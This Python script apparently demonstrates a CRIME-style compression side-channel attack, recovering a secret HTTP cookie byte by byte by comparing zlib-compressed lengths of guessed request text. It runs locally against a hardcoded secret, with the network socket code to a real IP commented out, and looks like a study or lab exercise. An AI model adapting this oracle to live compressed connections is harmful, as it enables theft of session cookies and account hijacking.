import socket
import string
import zlib
import time

HOST='142.250.4.102'
port=80
BUFFER_SIZE=1024
char_bytes=16
SECRET='6IvT8329s8BYN454'
ANS=''
HEADER1="POST /"
# HEADER2=""" HTTP/1.1
#             Host: example.com
#             User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
#             Cookie: secretcookie=""" + SECRET +" Accept-Language: en-US,en;q=0.8" 
HEADER2=""" HTTP/1.1
            Host: example.com
            Cookie: secretcookie="""
# HEADERS = """POST / HTTP/1.1
#                  Host: example.com
#                  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
#                  Cookie: secretcookie=""" + SECRET +" Accept-Language: en-US,en;q=0.8" 
HEADERS = """POST / HTTP/1.1
             Host: example.com
             User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
             Cookie: secretcookie=""" + SECRET 
data=HEADERS.encode("utf-8")
compressed = zlib.compress(data)
print("length of original ",len(compressed))
overall_count=0
sep_bug=0


# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.connect((HOST,port))
# # s.setblocking(1)	
# print("initial connection established")

for byte in range(1,char_bytes+1):

    possible_chars=string.digits+string.ascii_letters
    possible_chars_dict=dict()
    rep=False
    count=0


    while len(possible_chars)!=1:
        if HEADERS is None:
            print('Cannot find QAQ')
            break

        for alpha in possible_chars:
            # print("in alpha loop")
            test=HEADER1+"secretcookie="+ANS+alpha+HEADER2+SECRET[0:byte]
            
            if rep:
                test=test[count:]

            # s.send(test.encode("utf-8")+b'\r\n')
            # print("message encoded and sent")
            data=test.encode("utf-8")
            compressed = zlib.compress(data)
            # if alpha=='6':
            #     print("6 ::", test," gap ", compressed, len(compressed))
            # if alpha=='e':
            #     print("e ::", test," gap ",compressed, len(compressed))
            # if alpha=='l':
            #     print("l ::", test," gap ",compressed, len(compressed))
            # if alpha=='W':
            #     print("W ::", test," gap ",compressed, len(compressed))

            # if overall_count==3:
            #     if alpha=="6" or alpha=="e" or alpha=="l" or alpha=="W" or alpha=="T":
            #         print(alpha,"::",test)
            #         print()
            #         print()
            #         print(alpha,"::",data)
            #         print()
            #         print()
            #         print(alpha,"::",compressed)
            
            len_data=len(compressed)
            # print(len_data)
            # print(alpha)
            possible_chars_dict[alpha]=len_data

           
        
        min_val=min(possible_chars_dict.values())
        new_charset="".join(sk for sk,sv in possible_chars_dict.items() if sv==min_val)
        if overall_count==3:
            sep_bug+=1
            print("brute force round done") 
            print("possible_char_dict") 
            print(possible_chars_dict)
            print("min_val")
            print(min_val)
            print("new_charset")
            print("next char",new_charset)
            if sep_bug==4:
                exit()

        possible_chars=new_charset
        possible_char_dict=dict()
        if len(new_charset)>1:
            rep=True
            count+=1
        # print("brute force round done") 
        

        # HEADERS=HEADERS[1:]

    ANS+=possible_chars
    overall_count+=1
    print("done", ANS)
    print("Answer of first %s bytes: secret=%s" % (byte,ANS))
    # if overall_count==6:
        # exit()

print('\nFinal result: secret=%s' % ANS)
# s.close()




